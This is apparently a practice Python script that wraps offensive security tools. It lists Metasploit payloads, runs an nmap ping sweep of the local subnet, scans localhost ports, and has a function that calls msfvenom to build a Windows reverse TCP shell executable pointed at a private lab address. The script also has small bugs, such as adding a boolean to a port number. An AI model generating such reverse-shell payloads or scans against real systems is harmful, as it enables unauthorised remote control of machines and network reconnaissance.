#!/usr/bin/env python3                # specify the interpreter


### IMPORT STATEMENTS ###
import sys  # import the sys library
import subprocess
import socket


### HELPER FUNCTIONS ###
def get_local():  # define our line printing function
    return_code = subprocess.call(['ifconfig'])
    print("output:", return_code)

def open_payloads():
    return_code = subprocess.call(['msfvenom','-l','payloads'])
    print("output:", return_code)

def windows_reverse_payload():
    return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
    print("output:", return_code)

def check_var():
    program = 'msfvenom'
    arg_one = '-l'
    arg_two = 'payloads'
    return_code = subprocess.call([program,arg_one,arg_two])
    print("output:", return_code)

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    print(s.getsockname()[0])

def ping_sweep():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_address = s.getsockname()[0]
    ipremoved =''.join(local_address.rpartition('.')[:2])
    subnet = ipremoved + "1-255"
    return_code = subprocess.call(['nmap','-sP',subnet])
    print("output:", return_code)

def find_open_ports(): # determines if a port is in use on localhost\
    for port in range(1, 65535):
        with (socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:
            res = sock.connect_ex(('localhost', port))
            if res == 0:
                yield port

def is_port_in_use(port):
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

def call_ports():
    for ports in range(1,256):
        print(is_port_in_use(ports) + ports)


### MAIN FUNCTION ###
def main():  # define a main function
    available_ports = list(find_open_ports())
    print(available_ports)
    # call_ports()
    # windows_reverse_payload()
    # get_ip()
    # open_payloads()
    # get_local()

    # file_to_open = sys.argv[1]  # get the file name from the cmd line

    # opened_file = open(file_to_open)  # open the file

    # is_even(opened_file)  # call our print words function with the open file

    # opened_file.close()  # close the file when done


### DUNDER CHECK ###
if __name__ == '__main__':  # dunder check
    main()  # call the main function